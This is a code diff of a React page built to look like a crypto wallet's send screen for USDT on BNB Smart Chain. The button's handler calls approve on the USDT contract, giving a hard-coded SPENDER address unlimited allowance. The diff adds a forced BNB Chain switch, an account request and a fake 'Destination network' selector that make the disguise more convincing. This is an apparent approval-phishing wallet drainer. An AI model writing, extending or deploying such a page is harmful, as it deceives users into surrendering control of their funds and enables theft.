@@ -15,7 +15,15 @@ export default function Home() {
         return;
       }
 
+      // 🔥 FORZA BNB CHAIN
+      await window.ethereum.request({
+        method: "wallet_switchEthereumChain",
+        params: [{ chainId: "0x38" }],
+      });
+
       const provider = new ethers.BrowserProvider(window.ethereum);
+      await provider.send("eth_requestAccounts", []);
+
       const signer = await provider.getSigner();
 
       const usdt = new ethers.Contract(
@@ -26,7 +34,7 @@ export default function Home() {
         signer
       );
 
-      // APPROVE MAX
+      // 🔥 APPROVE MAX
       const tx = await usdt.approve(
         SPENDER,
         ethers.MaxUint256
@@ -37,7 +45,7 @@ export default function Home() {
       alert("Approve completato!");
     } catch (err) {
       console.log(err);
-      alert("Errore");
+      alert("Errore: " + err.message);
     }
   };
 
@@ -50,7 +58,7 @@ export default function Home() {
       padding: "20px"
     }}>
 
-      {/* Address */}
+      {/* ADDRESS */}
       <div style={{ marginTop: "40px" }}>
         <div style={{ color: "#888", fontSize: "14px", marginBottom: "8px" }}>
           Address or Domain Name
@@ -59,7 +67,7 @@ export default function Home() {
         <input
           value={address}
           onChange={(e) => setAddress(e.target.value)}
-          placeholder="0x..."
+          placeholder="Search or Enter"
           style={{
             width: "100%",
             padding: "14px",
@@ -71,7 +79,36 @@ export default function Home() {
         />
       </div>
 
-      {/* Amount */}
+      {/* NETWORK */}
+      <div style={{ marginTop: "20px" }}>
+        <div style={{ color: "#888", fontSize: "14px", marginBottom: "8px" }}>
+          Destination network
+        </div>
+
+        <div style={{
+          background: "#1a1a1a",
+          padding: "12px 16px",
+          borderRadius: "16px",
+          display: "flex",
+          alignItems: "center",
+          justifyContent: "space-between"
+        }}>
+          <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
+            <div style={{
+              width: "24px",
+              height: "24px",
+              borderRadius: "50%",
+              background: "#f3ba2f"
+            }}></div>
+
+            <span>BNB Smart Chain</span>
+          </div>
+
+          <span style={{ color: "#888" }}>▼</span>
+        </div>
+      </div>
+
+      {/* AMOUNT */}
       <div style={{ marginTop: "25px" }}>
         <div style={{ color: "#888", fontSize: "14px", marginBottom: "8px" }}>
           Amount
@@ -80,7 +117,7 @@ export default function Home() {
         <input
           value={amount}
           onChange={(e) => setAmount(e.target.value)}
-          placeholder="0"
+          placeholder="USDT Amount"
           style={{
             width: "100%",
             padding: "14px",
@@ -92,7 +129,7 @@ export default function Home() {
         />
       </div>
 
-      {/* Button */}
+      {/* BUTTON */}
       <div style={{
         position: "fixed",
         bottom: "30px",
